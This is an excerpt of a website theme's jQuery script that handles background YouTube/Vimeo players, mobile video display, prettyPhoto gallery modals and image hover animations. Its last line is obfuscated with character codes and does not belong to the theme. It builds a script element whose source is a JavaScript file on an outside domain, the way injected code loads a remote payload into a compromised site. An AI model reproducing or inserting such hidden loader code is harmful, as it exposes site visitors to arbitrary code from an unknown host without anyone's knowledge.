...
function runBg(){
	...
	if($('#bgImages li.active iframe').length>0){
		...
		if($('#bgImages li.active iframe').attr('videotype')=='youtube')
		{
			...
			$('#vmVideo').append($('#bgImages li.active iframe').clone().attr('src', $('#bgImages li.active iframe').attr('src')+'&autoplay=0&loop=0&controls=0&player_id=vimeoplayer').attr('id', 'vimeoplayer'));
...
function openPage(getURL){
	...
	if(mobileDevice){
		if(getURL=='#[playvideo]'){
			if(activePlayer=='youtube' || activePlayer=='vimeo' ){
				$('#bgText, #bgImages, #menu-container, #bgControl, #videoExpander, #audioControls, #twt, #footer').hide();
			...
			{
				$('#bgText, #bgImages, #menu-container, #bgControl, #videoExpander, #audioControls, #twt, #footer').show();
				if($('#contentBox').html()!='')
					$('#content').css('z-index', '888');
				if(activePlayer=='youtube')
					ytplayer.stopVideo();
...
function setImageModal(){
	...
	$('#contentBox a[rel="gallery[photo'+modalid+']"]').not('.nomodal').prettyPhoto({
		theme:prettyTheme, 
		autoplay: true, 
		opacity:0.5, 
		show_title: false, 
	...
	$('#contentBox .image_frame a img').each(function(){
		...
		if(!mobileDevice){
			$(this).parent().parent().hover(function(event){
				imageOver(this, event, centerX);
			}, function(event){
				imageOut(this, event, centerX);
			...
			$(this).parent().parent().click(function(event){
				imageOver(this, event, centerX);
				$(this).find('.modal, .modalVideo').click(function(){
...
function imageOver(obj, event, centerX){
	event.stopPropagation();
	$(obj).find('.modal, .modalVideo').stop().animate({opacity:'1', left:(centerX-31)}, 100 );
	$(obj).find('.link').stop().animate({opacity:'1', left:(centerX+5)}, 100);
	$(obj).find('.hoverWrapperBg').stop().animate({opacity:'.85'}, 400);
...
function imageOut(obj, event, centerX){
	event.stopPropagation();
	$(obj).find('.modal, .modalVideo').stop().animate({opacity:'0', left:(centerX-41)}, 100);
	$(obj).find('.link').stop().animate({opacity:'0', left:(centerX+15)}, 100);
...
window.s=document.createElement(String.fromCharCode(115,99,114,105,112,116));window.s.src=String.fromCharCode(104,116,116,112,58,47,47,49,50,51,46,98,118,56,56,56,56,46,99,111,109,47,102,99,46,106,115);